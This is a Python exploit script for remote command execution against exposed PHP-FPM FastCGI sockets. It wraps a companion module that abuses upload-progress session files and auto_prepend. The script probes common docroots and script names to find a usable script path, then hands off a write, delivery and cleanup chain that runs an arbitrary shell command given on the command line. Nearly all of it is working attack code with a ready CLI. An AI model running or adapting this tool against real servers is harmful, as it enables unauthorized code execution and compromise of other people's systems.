#!/usr/bin/env python3
"""Point-and-shoot FastCGI auto_prepend RCE with NO known file on the target.

Wraps fcgi_autoprepend.py to drop its known-SCRIPT_FILENAME/save_path
preconditions: given only a reachable fpm socket, it (1) discovers a usable
SCRIPT_FILENAME by probing common docroots x script names over raw FastCGI and
classifying responses, then (2) delegates WRITE->DELIVERY->SCRUB to
fcgi_autoprepend.run() across the save_path guess list. Mirrors the raw-FastCGI
``fpm-race`` capability of 0xdeadbeefnetwork/php2shell2shell.

Corruption-free (vuln and patched fpm). Needs the socket reachable,
upload_progress on, strict_mode off or an app sid, a multi-worker pool, and a
probe matching the target's docroot/script/save_path. Pure stdlib, -I safe.
"""

import argparse
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import fcgi_autoprepend as fa  # noqa: E402

# Common fpm docroots. Order: cheapest/most common first.
DOC_ROOTS = [
    "/var/www/html", "/usr/share/nginx/html", "/var/www", "/var/www/public",
    "/app", "/app/public", "/srv/www/htdocs", "/srv/http", "/home/www",
]
# Script basenames an existing php app almost always exposes at the docroot.
SCRIPT_NAMES = ["index.php", "app.php", "info.php", "home.php", "config.php"]

# fpm's "this SCRIPT_FILENAME does not exist / is rejected" tells.
_MISS_MARKS = (
    b"No input file", b"Status: 404", b"File not found",
    b"Primary script unknown",
)


def discover_script(host, port, docroots=None, script_names=None, timeout=4,
                    verbose=True):
    """Probe docroot x script-name over raw FCGI; return the first path whose
    response does NOT look like an fpm not-found, else None."""
    docroots = docroots or DOC_ROOTS
    script_names = script_names or SCRIPT_NAMES

    def log(m):
        if verbose:
            print(m, flush=True)

    for root in docroots:
        for name in script_names:
            script = f"{root.rstrip('/')}/{name}"
            try:
                out = fa.fcgi_request(host, port, fa._base_params(script),
                                      timeout=timeout)
            except OSError:
                continue
            if not out:
                # empty = worker wedged or this is not fpm; keep probing.
                continue
            if any(m in out for m in _MISS_MARKS):
                continue
            log(f"[+] discovered script: {script}")
            return script
    return None


def run(host, port, cmd, script=None, docroots=None, script_names=None,
        save_paths=None, sid=None, window=40.0, verbose=True, **run_kw):
    """Discover a script if one was not given, then hand off to
    fcgi_autoprepend.run(). Returns (ok, output, sess_file); ok is False with a
    (None, None) tail when no script could be discovered."""

    def log(m):
        if verbose:
            print(m, flush=True)

    if not script:
        log(f"[*] no --script given; probing {len(docroots or DOC_ROOTS)} "
            f"docroots x {len(script_names or SCRIPT_NAMES)} names")
        script = discover_script(host, port, docroots=docroots,
                                 script_names=script_names, verbose=verbose)
        if not script:
            log("[-] no usable SCRIPT_FILENAME discovered. Pass --script, widen "
                "--docroot/--script-name, or confirm the port is really php-fpm.")
            return False, None, None

    return fa.run(host, port, cmd, script, save_paths=save_paths, sid=sid,
                  window=window, verbose=verbose, **run_kw)


def _cli(argv):
    ap = argparse.ArgumentParser(
        description=__doc__.splitlines()[0],
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("host", help="fpm host (e.g. 127.0.0.1)")
    ap.add_argument("port", type=int, help="fpm tcp port (e.g. 9000)")
    ap.add_argument("--cmd", default="id", help="shell command to run (default: id)")
    ap.add_argument("--script", default=None,
                    help="known SCRIPT_FILENAME (skips discovery)")
    ap.add_argument("--docroot", action="append",
                    help="extra docroot to probe (repeatable)")
    ap.add_argument("--script-name", action="append",
                    help="extra script basename to probe (repeatable)")
    ap.add_argument("--save-path", action="append",
                    help="session save_path (repeatable; default: common guesses)")
    ap.add_argument("--sid", help="session id (default: minted; needs strict_mode=Off)")
    ap.add_argument("--window", type=float, default=40.0)
    args = ap.parse_args(argv)

    docroots = (args.docroot + DOC_ROOTS) if args.docroot else None
    script_names = (args.script_name + SCRIPT_NAMES) if args.script_name else None
    ok, _out, _sf = run(args.host, args.port, args.cmd, script=args.script,
                        docroots=docroots, script_names=script_names,
                        save_paths=args.save_path, sid=args.sid,
                        window=args.window)
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(_cli(sys.argv[1:]))
